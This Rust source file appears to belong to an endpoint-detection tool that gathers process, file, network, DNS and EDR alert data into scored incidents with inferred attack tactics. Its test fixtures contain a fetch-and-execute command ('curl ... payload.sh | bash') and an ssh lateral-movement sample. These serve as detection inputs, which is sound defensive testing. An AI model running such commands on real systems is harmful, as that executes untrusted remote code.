use std::collections::HashSet;
use std::path::Path;

use anyhow::{Result, anyhow};
use serde::Serialize;

use crate::engine::ioc::{AttackTag, IOCHit, detect_ioc_hits, infer_attack_tags};
use crate::engine::proc_tree::{
    ProcessTree, RelatedDnsEvent, RelatedFileEvent, RelatedNetworkEvent, dns_events_for_pids,
    file_events_for_pids, network_events_for_pids,
};
use crate::engine::trust::{
    HostTrustAssessment, ProcessTrustAssessment, assess_host_trust, assess_process_trust,
};
use crate::model::event::RawEvent;
use crate::model::incident::{Incident, IncidentEDREvidence};
use crate::model::process::ProcessNode;
use crate::model::ring0::Ring0Finding;
use crate::storage::sqlite;

#[derive(Debug, Clone, Copy)]
struct IncidentSignalCounts {
    sensitive_files: i32,
    external: i32,
    lateral: i32,
    dns_high_entropy: i32,
    ioc_hits: i32,
    descendant_count: i32,
}

#[derive(Debug, Clone, Serialize)]
pub struct IncidentBundle {
    pub incident: Incident,
    pub root_process: ProcessNode,
    pub ancestry: Vec<ProcessNode>,
    pub descendants: Vec<ProcessNode>,
    pub file_events: Vec<RelatedFileEvent>,
    pub network_events: Vec<RelatedNetworkEvent>,
    pub dns_events: Vec<RelatedDnsEvent>,
    pub edr_evidence: Vec<IncidentEDREvidence>,
    pub ring0_findings: Vec<Ring0Finding>,
    pub process_trust: ProcessTrustAssessment,
    pub host_trust: HostTrustAssessment,
    pub ioc_hits: Vec<IOCHit>,
    pub attack_tags: Vec<AttackTag>,
    pub summary_lines: Vec<String>,
    pub process_graph_mermaid: String,
}

pub fn aggregate_incident_for_pid(
    pid: i64,
    db_path: &Path,
    raw_events: &[RawEvent],
    ring0_findings: &[Ring0Finding],
) -> Result<IncidentBundle> {
    let tree = ProcessTree::build(raw_events)?;
    let root_process = tree
        .get_by_pid(pid)
        .cloned()
        .ok_or_else(|| anyhow!("no process found for pid={pid}"))?;

    let ancestry = tree.ancestry_by_pid(pid, 16);
    let descendants = tree.descendants_by_pid(pid, 64);
    let pid_scope = build_pid_scope(root_process.pid, &descendants);
    let time_window = derive_time_window(&ancestry, &descendants, &root_process);
    let file_events = file_events_for_pids(
        raw_events,
        &pid_scope,
        Some(time_window.0),
        Some(time_window.1),
    );
    let network_events = network_events_for_pids(
        raw_events,
        &pid_scope,
        Some(time_window.0),
        Some(time_window.1),
    );
    let dns_events = dns_events_for_pids(
        raw_events,
        &pid_scope,
        Some(time_window.0),
        Some(time_window.1),
    );
    let edr_evidence = collect_edr_evidence(
        db_path,
        &pid_scope,
        root_process.process_guid.as_deref(),
        extract_host_hint(&root_process),
        time_window.0,
        time_window.1,
    )?;
    let process_trust =
        assess_process_trust(&root_process, &file_events, &network_events, &dns_events);
    let host_trust = assess_host_trust(ring0_findings);
    let ioc_hits = detect_ioc_hits(&root_process, &file_events, &network_events, &dns_events);
    let attack_tags = infer_attack_tags(&root_process, &file_events, &network_events, &dns_events);
    let process_graph_mermaid = render_process_graph_mermaid(&ancestry, &descendants);

    let sensitive_file_count = file_events.iter().filter(|event| event.sensitive).count() as i32;
    let external_count = network_events.iter().filter(|event| event.external).count() as i32;
    let lateral_count = network_events
        .iter()
        .filter(|event| event.lateral_movement_hint)
        .count() as i32;
    let high_entropy_dns_count =
        dns_events.iter().filter(|event| event.high_entropy).count() as i32;
    let descendant_count = descendants.len() as i32;

    let signal_counts = IncidentSignalCounts {
        sensitive_files: sensitive_file_count,
        external: external_count,
        lateral: lateral_count,
        dns_high_entropy: high_entropy_dns_count,
        ioc_hits: ioc_hits.len() as i32,
        descendant_count,
    };

    let severity = compute_severity(signal_counts);
    let confidence = compute_confidence(signal_counts, !edr_evidence.is_empty(), &host_trust.level);

    let mut summary_lines = Vec::new();
    summary_lines.push(format!(
        "pid {} executed {:?}",
        root_process.pid, root_process.exe_path
    ));
    if descendant_count > 0 {
        summary_lines.push(format!(
            "expanded incident scope to {} descendant process(es)",
            descendant_count
        ));
    }
    summary_lines.push(format!(
        "aggregated event window {} -> {}",
        time_window.0, time_window.1
    ));

    if sensitive_file_count > 0 {
        summary_lines.push(format!(
            "accessed {} sensitive file event(s)",
            sensitive_file_count
        ));
    }
    if external_count > 0 {
        summary_lines.push(format!(
            "opened {} external network connection(s)",
            external_count
        ));
    }
    if lateral_count > 0 {
        summary_lines.push(format!(
            "showed {} lateral movement network hint(s)",
            lateral_count
        ));
    }
    if high_entropy_dns_count > 0 {
        summary_lines.push(format!(
            "issued {} high-entropy dns query event(s)",
            high_entropy_dns_count
        ));
    }
    if !ring0_findings.is_empty() {
        summary_lines.push(format!(
            "host has {} ring0 finding(s) in current database",
            ring0_findings.len()
        ));
    }
    if !ioc_hits.is_empty() {
        summary_lines.push(format!("matched {} IOC rule(s)", ioc_hits.len()));
    }
    if !edr_evidence.is_empty() {
        summary_lines.push(format!(
            "matched {} EDR evidence item(s)",
            edr_evidence.len()
        ));
    }
    summary_lines.push(format!(
        "process trust score is {} and host trust level is {}",
        process_trust.score, host_trust.level
    ));

    let first_seen_at = ancestry
        .iter()
        .chain(descendants.iter())
        .map(|node| node.start_time)
        .min()
        .unwrap_or(root_process.start_time);
    let last_seen_at = descendants
        .iter()
        .filter_map(|node| node.exit_time)
        .max()
        .unwrap_or(time_window.1);

    let incident = Incident {
        id: format!("incident:pid:{pid}:{}", root_process.start_time),
        incident_key: format!("pid:{pid}:{}", root_process.start_time),
        title: format!(
            "Process incident for pid {} ({})",
            root_process.pid,
            root_process
                .comm
                .clone()
                .unwrap_or_else(|| "unknown".to_string())
        ),
        summary: summary_lines.join("; "),
        severity,
        confidence,
        status: "open".to_string(),
        root_pid: Some(root_process.pid),
        root_process_guid: root_process.process_guid.clone(),
        host_id: None,
        hostname: None,
        first_seen_at,
        last_seen_at,
        source_count: 1
            + i32::from(!ring0_findings.is_empty())
            + i32::from(!edr_evidence.is_empty())
            + i32::from(!ioc_hits.is_empty()),
        event_count: (file_events.len()
            + network_events.len()
            + ancestry.len()
            + descendants.len()
            + edr_evidence.len()
            + ioc_hits.len()) as i32,
        tactic_tags_json: Some(
            infer_tactics(&attack_tags, &network_events, ring0_findings)
                .iter()
                .map(|tag| format!(r#""{}""#, tag))
                .collect::<Vec<_>>()
                .join(",")
                .pipe(|body| format!("[{}]", body)),
        ),
        evidence_json: None,
        created_at: root_process.start_time,
        updated_at: last_seen_at,
    };

    Ok(IncidentBundle {
        incident,
        root_process,
        ancestry,
        descendants,
        file_events,
        network_events,
        dns_events,
        edr_evidence,
        ring0_findings: ring0_findings.to_vec(),
        process_trust,
        host_trust,
        ioc_hits,
        attack_tags,
        summary_lines,
        process_graph_mermaid,
    })
}

fn compute_severity(counts: IncidentSignalCounts) -> i32 {
    let mut score = 3;
    if counts.sensitive_files > 0 {
        score += 3;
    }
    if counts.external > 0 {
        score += 1;
    }
    if counts.lateral > 0 {
        score += 2;
    }
    if counts.dns_high_entropy > 0 {
        score += 2;
    }
    if counts.ioc_hits > 0 {
        score += 1;
    }
    if counts.descendant_count > 1 {
        score += 1;
    }
    score.clamp(1, 10)
}

fn compute_confidence(
    counts: IncidentSignalCounts,
    has_edr_evidence: bool,
    host_trust_level: &str,
) -> f32 {
    let mut confidence: f32 = 0.35;
    if counts.sensitive_files > 0 {
        confidence += 0.25;
    }
    if counts.external > 0 {
        confidence += 0.10;
    }
    if counts.lateral > 0 {
        confidence += 0.20;
    }
    if counts.dns_high_entropy > 0 {
        confidence += 0.15;
    }
    if counts.ioc_hits > 0 {
        confidence += 0.10;
    }
    if counts.descendant_count > 1 {
        confidence += 0.05;
    }
    if has_edr_evidence {
        confidence += 0.10;
    }
    if has_edr_evidence && matches!(host_trust_level, "L2" | "L3") {
        confidence += 0.05;
    }
    confidence.min(0.95)
}

fn infer_tactics(
    attack_tags: &[AttackTag],
    network_events: &[RelatedNetworkEvent],
    ring0_findings: &[Ring0Finding],
) -> Vec<&'static str> {
    let mut tags = Vec::new();

    for attack_tag in attack_tags {
        match attack_tag.tactic.as_str() {
            "execution" => push_unique_tactic(&mut tags, "execution"),
            "collection" => push_unique_tactic(&mut tags, "collection"),
            "persistence" => push_unique_tactic(&mut tags, "persistence"),
            "command_and_control" => push_unique_tactic(&mut tags, "command_and_control"),
            "lateral_movement" => push_unique_tactic(&mut tags, "lateral_movement"),
            _ => {}
        }
    }

    if network_events.iter().any(|event| event.external) {
        push_unique_tactic(&mut tags, "command_and_control");
    }
    if network_events
        .iter()
        .any(|event| event.lateral_movement_hint)
    {
        push_unique_tactic(&mut tags, "lateral_movement");
    }
    if !ring0_findings.is_empty() {
        push_unique_tactic(&mut tags, "defense_evasion");
    }

    if tags.is_empty() {
        tags.push("execution");
    }

    tags
}

fn push_unique_tactic(tags: &mut Vec<&'static str>, candidate: &'static str) {
    if !tags.contains(&candidate) {
        tags.push(candidate);
    }
}

fn collect_edr_evidence(
    db_path: &Path,
    pids: &[i64],
    process_guid: Option<&str>,
    host_hint: Option<String>,
    window_start: i64,
    window_end: i64,
) -> Result<Vec<IncidentEDREvidence>> {
    let mut events = Vec::new();
    let mut alerts = Vec::new();
    let mut seen_event_ids = HashSet::new();
    let mut seen_alert_ids = HashSet::new();

    for pid in pids {
        for event in sqlite::find_edr_events_by_pid_or_guid(db_path, Some(*pid), process_guid, 32)?
        {
            if seen_event_ids.insert(event.id.clone()) {
                events.push(event);
            }
        }
        for alert in sqlite::find_edr_alerts_by_pid_or_guid(db_path, Some(*pid), process_guid, 32)?
        {
            if seen_alert_ids.insert(alert.id.clone()) {
                alerts.push(alert);
            }
        }
    }

    if pids.is_empty() || process_guid.is_some() {
        for event in sqlite::find_edr_events_by_pid_or_guid(db_path, None, process_guid, 32)? {
            if seen_event_ids.insert(event.id.clone()) {
                events.push(event);
            }
        }
        for alert in sqlite::find_edr_alerts_by_pid_or_guid(db_path, None, process_guid, 32)? {
            if seen_alert_ids.insert(alert.id.clone()) {
                alerts.push(alert);
            }
        }
    }

    let mut evidence = Vec::new();
    let mut seen = HashSet::new();

    for event in &events {
        if event.observed_at < window_start.saturating_sub(300)
            || event.observed_at > window_end.saturating_add(300)
        {
            continue;
        }

        let linked_alert = alerts.iter().find(|alert| {
            (alert.process_guid == event.process_guid
                || host_matches(
                    host_hint.as_deref(),
                    alert.host_id.as_deref(),
                    alert.hostname.as_deref(),
                ))
                && alert.pid == event.pid
                && (alert.observed_at - event.observed_at).abs() <= 300
        });

        let dedupe_key = format!(
            "{}|{}|{}|{}|{}",
            event.vendor,
            event.event_name,
            event.pid.unwrap_or_default(),
            event.process_guid.clone().unwrap_or_default(),
            event.observed_at
        );
        if !seen.insert(dedupe_key) {
            continue;
        }

        evidence.push(IncidentEDREvidence {
            event_id: event.id.clone(),
            alert_id: linked_alert.map(|alert| alert.id.clone()),
            vendor: event.vendor.clone(),
            adapter_name: event.adapter_name.clone(),
            event_name: event.event_name.clone(),
            alert_name: linked_alert.map(|alert| alert.alert_name.clone()),
            pid: event.pid,
            process_guid: event.process_guid.clone(),
            severity: event
                .severity
                .or_else(|| linked_alert.map(|alert| alert.severity)),
            observed_at: event.observed_at,
            summary: linked_alert.and_then(|alert| alert.summary.clone()),
        });
    }

    for alert in alerts {
        if alert.observed_at < window_start.saturating_sub(300)
            || alert.observed_at > window_end.saturating_add(300)
        {
            continue;
        }

        let already_linked = evidence
            .iter()
            .any(|item| item.alert_id.as_deref() == Some(alert.id.as_str()));
        if already_linked {
            continue;
        }

        let linked_event_exists = events.iter().any(|event| {
            (event.process_guid == alert.process_guid
                || host_matches(
                    host_hint.as_deref(),
                    event.host_id.as_deref(),
                    event.hostname.as_deref(),
                ))
                && event.pid == alert.pid
                && event.event_name == alert.alert_name
                && (event.observed_at - alert.observed_at).abs() <= 300
        });
        if linked_event_exists {
            continue;
        }

        let dedupe_key = format!(
            "{}|{}|{}|{}|{}",
            alert.vendor,
            alert.alert_name,
            alert.pid.unwrap_or_default(),
            alert.process_guid.clone().unwrap_or_default(),
            alert.observed_at
        );
        if !seen.insert(dedupe_key) {
            continue;
        }

        evidence.push(IncidentEDREvidence {
            event_id: format!("edr:evidence:alert-only:{}", alert.id),
            alert_id: Some(alert.id),
            vendor: alert.vendor,
            adapter_name: alert.adapter_name,
            event_name: "alert_only".to_string(),
            alert_name: Some(alert.alert_name),
            pid: alert.pid,
            process_guid: alert.process_guid,
            severity: Some(alert.severity),
            observed_at: alert.observed_at,
            summary: alert.summary,
        });
    }

    evidence.sort_by_key(|item| std::cmp::Reverse(item.observed_at));
    Ok(evidence)
}

fn build_pid_scope(root_pid: i64, descendants: &[ProcessNode]) -> Vec<i64> {
    let mut pid_scope = Vec::new();
    let mut seen = HashSet::new();

    if seen.insert(root_pid) {
        pid_scope.push(root_pid);
    }

    for node in descendants {
        if seen.insert(node.pid) {
            pid_scope.push(node.pid);
        }
    }

    pid_scope.sort_unstable();
    pid_scope
}

fn derive_time_window(
    ancestry: &[ProcessNode],
    descendants: &[ProcessNode],
    root_process: &ProcessNode,
) -> (i64, i64) {
    let earliest = ancestry
        .iter()
        .chain(descendants.iter())
        .map(|node| node.start_time)
        .min()
        .unwrap_or(root_process.start_time)
        .saturating_sub(300);
    let latest = ancestry
        .iter()
        .chain(descendants.iter())
        .flat_map(|node| [Some(node.start_time), node.exit_time])
        .flatten()
        .max()
        .unwrap_or(root_process.exit_time.unwrap_or(root_process.start_time))
        .saturating_add(300);

    (earliest, latest)
}

fn render_process_graph_mermaid(ancestry: &[ProcessNode], descendants: &[ProcessNode]) -> String {
    let mut nodes = Vec::new();
    let mut edges = HashSet::new();
    let mut seen = HashSet::new();

    for node in ancestry.iter().chain(descendants.iter()) {
        if seen.insert(node.process_key.clone()) {
            nodes.push(node.clone());
        }
    }

    nodes.sort_by_key(|node| node.start_time);

    let mut out = String::from("graph TD\n");
    for node in &nodes {
        out.push_str(&format!(
            "    {}[\"PID {} {}\"]\n",
            mermaid_node_id(node),
            node.pid,
            mermaid_label(node)
        ));
    }

    for node in &nodes {
        if let Some(parent_key) = &node.parent_process_key
            && let Some(parent) = nodes
                .iter()
                .find(|candidate| &candidate.process_key == parent_key)
        {
            if parent.process_key == node.process_key {
                continue;
            }
            let edge = format!("{} --> {}", mermaid_node_id(parent), mermaid_node_id(node));
            if edges.insert(edge.clone()) {
                out.push_str("    ");
                out.push_str(&edge);
                out.push('\n');
            }
        }
    }

    out
}

fn mermaid_node_id(node: &ProcessNode) -> String {
    format!("pid_{}_{}", node.pid, node.start_time)
}

fn mermaid_label(node: &ProcessNode) -> String {
    node.comm
        .clone()
        .or_else(|| node.exe_path.clone())
        .unwrap_or_else(|| "unknown".to_string())
        .replace('"', "'")
}

fn extract_host_hint(process: &ProcessNode) -> Option<String> {
    process
        .trust_reasons_json
        .as_deref()
        .and_then(|value| value.strip_prefix("[\"host:"))
        .and_then(|value| value.strip_suffix("\"]"))
        .map(str::to_string)
}

fn host_matches(host_hint: Option<&str>, host_id: Option<&str>, hostname: Option<&str>) -> bool {
    let Some(hint) = host_hint else {
        return false;
    };
    host_id == Some(hint) || hostname == Some(hint)
}

trait Pipe: Sized {
    fn pipe<F, T>(self, f: F) -> T
    where
        F: FnOnce(Self) -> T,
    {
        f(self)
    }
}

impl<T> Pipe for T {}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::PathBuf;
    use std::time::{SystemTime, UNIX_EPOCH};

    use crate::engine::ioc::AttackTag;
    use crate::model::event::RawEvent;
    use crate::model::ring0::Ring0Finding;
    use crate::storage::sqlite;

    use super::{aggregate_incident_for_pid, infer_tactics};

    #[test]
    fn aggregate_incident_attaches_edr_evidence_by_pid() {
        let db_path = temp_db_path("incident-edr");
        sqlite::init_database(&db_path).expect("db init should succeed");

        let raw_tracee = RawEvent {
            id: "tracee:1718611200:sched_process_exec:4242:1".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611200,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611200".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611200,"eventName":"sched_process_exec","hostName":"blue","processId":4242,"parentProcessId":1,"userId":0,"processName":"bash","args":[{"name":"pathname","value":"/usr/bin/bash"},{"name":"argv","value":["bash","-c","curl http://10.0.0.5/payload.sh | bash"]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611200,
        };

        let edr_raw = RawEvent {
            id: "raw:edr:test:1".to_string(),
            source_kind: "edr".to_string(),
            source_name: "generic".to_string(),
            event_name: "edr_process_alert".to_string(),
            observed_at: 1718611205,
            host_id: Some("blue-host".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("proc-guid-1".to_string()),
            severity: Some(8),
            payload_ref: None,
            payload_json: Some(r#"{"event_name":"edr_process_alert","alert_name":"suspicious_bash","host_id":"blue-host","hostname":"blue","pid":4242,"process_guid":"proc-guid-1","severity":8,"observed_at":1718611205,"summary":"sample edr alert"}"#.to_string()),
            ingest_method: "edr-webhook".to_string(),
            ingest_job_id: None,
            created_at: 1718611205,
        };

        sqlite::insert_raw_events(&db_path, std::slice::from_ref(&edr_raw))
            .expect("insert raw edr should succeed");
        sqlite::insert_edr_events(
            &db_path,
            &[crate::model::edr::EDREvent {
                id: "edr:event:test:1".to_string(),
                vendor: "generic".to_string(),
                adapter_name: "generic".to_string(),
                external_event_id: None,
                host_id: Some("blue-host".to_string()),
                agent_id: None,
                hostname: Some("blue".to_string()),
                process_guid: Some("proc-guid-1".to_string()),
                pid: Some(4242),
                ppid: Some(1),
                exe_path: Some("/usr/bin/bash".to_string()),
                cmdline: Some("bash -c curl http://10.0.0.5/payload.sh | bash".to_string()),
                file_path: None,
                src_ip: None,
                dst_ip: None,
                dst_port: None,
                severity: Some(8),
                event_name: "edr_process_alert".to_string(),
                observed_at: 1718611205,
                raw_event_id: Some(edr_raw.id.clone()),
                normalized_event_id: None,
            }],
        )
        .expect("insert edr event should succeed");
        sqlite::insert_edr_alerts(
            &db_path,
            &[crate::model::edr::EDRAlert {
                id: "edr:alert:test:1".to_string(),
                vendor: "generic".to_string(),
                adapter_name: "generic".to_string(),
                external_alert_id: None,
                host_id: Some("blue-host".to_string()),
                hostname: Some("blue".to_string()),
                alert_name: "suspicious_bash".to_string(),
                severity: 8,
                status: "open".to_string(),
                process_guid: Some("proc-guid-1".to_string()),
                pid: Some(4242),
                tactic_tags_json: None,
                summary: Some("sample edr alert".to_string()),
                observed_at: 1718611205,
                raw_event_id: Some(edr_raw.id.clone()),
            }],
        )
        .expect("insert edr alert should succeed");

        let bundle =
            aggregate_incident_for_pid(4242, &db_path, &[raw_tracee], &[] as &[Ring0Finding])
                .expect("incident aggregation should succeed");

        assert!(!bundle.edr_evidence.is_empty());
        assert!(
            bundle
                .summary_lines
                .iter()
                .any(|line| line.contains("EDR evidence item"))
        );

        let _ = fs::remove_file(&db_path);
    }

    #[test]
    fn aggregate_incident_expands_scope_to_descendants_and_time_window() {
        let db_path = temp_db_path("incident-descendants");
        sqlite::init_database(&db_path).expect("db init should succeed");

        let parent_exec = RawEvent {
            id: "tracee:1718611200:sched_process_exec:4242:1".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611200,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611200".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611200,"eventName":"sched_process_exec","hostName":"blue","processId":4242,"parentProcessId":1,"userId":0,"processName":"bash","args":[{"name":"pathname","value":"/usr/bin/bash"},{"name":"argv","value":["bash","-c","curl http://10.0.0.5/payload.sh | bash"]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611200,
        };
        let child_fork = RawEvent {
            id: "tracee:1718611205:sched_process_fork:4242:2".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_fork".to_string(),
            observed_at: 1718611205,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:9001:1718611205".to_string()),
            severity: Some(3),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611205,"eventName":"sched_process_fork","hostName":"blue","processId":4242,"childProcessId":9001}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611205,
        };
        let child_exec = RawEvent {
            id: "tracee:1718611210:sched_process_exec:9001:3".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611210,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:9001:1718611205".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611210,"eventName":"sched_process_exec","hostName":"blue","processId":9001,"parentProcessId":4242,"userId":0,"processName":"ssh","args":[{"name":"pathname","value":"/usr/bin/ssh"},{"name":"argv","value":["ssh","root@10.0.0.9"]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611210,
        };
        let child_net = RawEvent {
            id: "tracee:1718611212:tcp_connect:9001:4".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "tcp_connect".to_string(),
            observed_at: 1718611212,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:9001:1718611205".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611212,"eventName":"tcp_connect","hostName":"blue","processId":9001,"threadId":9001,"parentProcessId":4242,"userId":0,"processName":"ssh","args":[{"name":"remote_addr","value":"10.0.0.9"},{"name":"remote_port","value":22}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611212,
        };

        let bundle = aggregate_incident_for_pid(
            4242,
            &db_path,
            &[parent_exec, child_fork, child_exec, child_net],
            &[] as &[Ring0Finding],
        )
        .expect("incident aggregation should succeed");

        assert!(bundle.descendants.iter().any(|node| node.pid == 9001));
        assert!(bundle.network_events.iter().any(|event| event.pid == 9001));
        assert!(
            bundle
                .summary_lines
                .iter()
                .any(|line| line.contains("expanded incident scope"))
        );
        assert!(bundle.process_graph_mermaid.contains("PID 9001 ssh"));

        let _ = fs::remove_file(&db_path);
    }

    #[test]
    fn infer_tactics_promotes_persistence_and_command_and_control_from_attack_tags() {
        let attack_tags = vec![
            AttackTag {
                tactic: "persistence".to_string(),
                technique_hint: "systemd_persistence".to_string(),
                reason: "process touched a systemd unit path".to_string(),
            },
            AttackTag {
                tactic: "command_and_control".to_string(),
                technique_hint: "reverse_shell".to_string(),
                reason: "command line matches a reverse shell pattern".to_string(),
            },
        ];

        let tactics = infer_tactics(&attack_tags, &[], &[]);

        assert!(tactics.contains(&"persistence"));
        assert!(tactics.contains(&"command_and_control"));
    }

    fn temp_db_path(prefix: &str) -> PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or_default();
        std::env::temp_dir().join(format!("{prefix}-{nanos}.db"))
    }
}
